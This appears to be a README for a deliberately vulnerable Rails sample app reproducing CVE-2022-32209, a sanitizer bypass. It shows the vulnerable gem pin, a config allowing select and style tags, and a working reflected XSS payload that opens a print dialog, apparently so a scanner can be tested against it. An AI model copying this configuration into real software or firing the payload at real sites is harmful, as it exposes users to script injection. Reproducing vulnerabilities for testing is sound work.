# CVE-2022-32209

This is a sample application vulnerable to CVE-2022-32209.
As shown on [Hackerone](https://hackerone.com/reports/1530898), if you use the 
Rails HTML sanitizer (1.4.2 or before) with `style` and `select` tags allowed,
it will not properly snaitize untrusted inputs.

To run the app, run `make build` to build the Docker containers,
then `make up` to start them. The vulnerable app will be at [http://localhost:8888](http://localhost:8888).
There is an endpoint [http://localhost:8888/somewhere?name=carlos](http://localhost:8888/somewhere?name=carlos)
which reflects your the parameter name after running it through the sanitizer.
Opening [http://localhost:8888/somewhere?name=%3Cselect%3E%3Cstyle%3E%3Cscript%3Eprint()%3C/script%3E%3C/style%3E%3C/select%3E](http://localhost:8888/somewhere?name=%3Cselect%3E%3Cstyle%3E%3Cscript%3Eprint()%3C/script%3E%3C/style%3E%3C/select%3E)
will execute JavaScript (opens a print dialog).


There is another container with a scanner. It basically just checks if the name payload 
comes back unchanged.

## Rails app

Steps for building the sample app where:

Most recent version of Rails, but in Gemfile lock downgraded the HTML sanitizer gem to vulnerable version:

```
    rails-html-sanitizer (1.4.2)
```


In the Rails config, allow at least the `select` and `style` tags in the HTML sanitizer:

```ruby
module Target
  class Application < Rails::Application
    config.load_defaults 7.0

    config.action_view.sanitized_allowed_tags = ["select", "style"]
  end
end

```

Now add the route and reflect a sanitized value of a query parameter.
For example, I put this into `app/views/somewhere/index.html.erb`,
which renders for any request to `/somewhere`:

```
<h1>This page reflects the parameter "name"</h1>

<p>Hello <%= sanitize @name %></p>
```

Now request this URL to see how JavaScript is executed: `http://localhost:8888/somewhere?name=anyprefix<select><style><script>print()</script></style></select>anysuffix`





